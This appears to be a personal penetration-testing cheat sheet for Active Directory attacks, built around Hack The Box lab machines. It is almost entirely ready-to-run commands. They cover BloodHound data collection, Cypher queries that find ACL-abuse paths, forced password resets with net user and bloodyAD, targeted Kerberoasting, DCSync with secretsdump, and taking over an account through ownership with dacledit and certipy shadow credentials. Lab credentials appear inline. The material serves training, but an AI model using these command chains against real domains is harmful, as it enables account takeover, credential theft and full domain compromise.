On target:
```
. .\SharpHound.ps1
```
```
Invoke-BloodHound -CollectionMethod All
```
or run remotely:
```
bloodhound-python -c All -dc FOREST.htb.local -gc FOREST.htb.local -ns 10.129.175.196 -d htb.local -u svc-alfresco -p 's3rvice'
```
or
```
bloodhound-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174
```
or use nxc:
```
nxc ldap administrator.htb -u Olivia -p ichliebedich --bloodhound --collection All --dns-tcp --dns-server 10.10.11.42
```

 then start neo4j
- `sudo neo4j console`
- neo4j:(kali pw)
- `bloodhound`
- run command from another terminal tab
- clear database
- upload Data

#### Queries
```
MATCH (m:Computer) RETURN m
```
- see computers
```
MATCH (m:User) RETURN m
```
- see users
- marked any users with creds as "owned"
	- check owned users for OUTBOUND OBJECT CONTROL > First Degree Object Control
		- Looking for GenericAll, GenericWrite, ForceChangePassword
			- create potential attack path (ex: olivia has GenericAll over Michael & Michael has ForceChangePassword over Benjamin = probably worth checking out)
```
MATCH (n:User {admincount:False}) MATCH (m) WHERE NOT m.name = n.name MATCH p=allShortestPaths((n)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(m)) RETURN p
```
- show privs all non-admin users have against all other nodes
```
MATCH (n:User {admincount:False}) MATCH (m:User) WHERE NOT m.name = n.name MATCH p=allShortestPaths((n)-[r:AllExtendedRights|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner*1..]->(m)) RETURN p
```
- show ACL abuse non-admin users has against other users
```
MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|AdminTo|CanRDP|ExecuteDCOM|ForceChangePassword*1..]->(m:Computer)) RETURN p
```
- show ACL abuse non-admin users have against computers
```
MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AddMember*1..]->(m:Group)) RETURN p
```
- show non-admin users that have rights to add members into groups
```
MATCH (u:User) WHERE ANY (x IN u.serviceprincipalnames WHERE toUpper(x) CONTAINS 'SQL')RETURN u
```
- find SPNs with specific keywords (swap `SQL` for anything)
#### If user (Olivia) has GenericAll permissions over another user (Michael)
```
net user Michael Password123
```
- Change benjamin's password if currently owned user has GenericAll over benjamin
	- then login as that user and spray all open services with new creds
- can also use bloodyAD command below (if no shell)
#### If user (Michael) has ForceChangePassword over another user (Benjamin)
```
bloodyAD -u "Michael" -p "Password123" -d "Administrator.htb" --host "10.10.11.42" set password "Benjamin" "12345678"
```
- using succesfully authenticated creds of michael to reset Benjamin's password
#### If user (Emily) has GenericWrite permissions over another user (Ethan)
- make sure IP is in `/etc/hosts` with all subdomains
```
sudo ntpdate administrator.htb
```
- syncs timezone for kerberos
- may need to run multiple times if below command fails:
```
targetedKerberoast -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --dc-ip 10.10.11.42
```
- running this command with Emily will display the hash for Ethan
	- run john to crack the hash, then use pw below for secretsdump command
#### If user (Ethan) has DCsync over domain (dc.administrator.htb)
```
secretsdump.py "Administrator.htb/ethan:limpbizkit"@"dc.Administrator.htb"
```

#### If user (ryan) has writeOwner permissions over another user (ca_svc), run these commands in fast sequence:
```
bloodyAD --host '10.10.11.51' -d 'escapetwo.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'
```
```
dacledit.pyÂ  -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
```
```
sudo ntpdate sequel.htb
```
```
certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'
```
- sets ryan as owner of ca_svc
- once owner, 2nd command gives ryan full control of ca_svc
- syncs time
- should return hash for ca_svc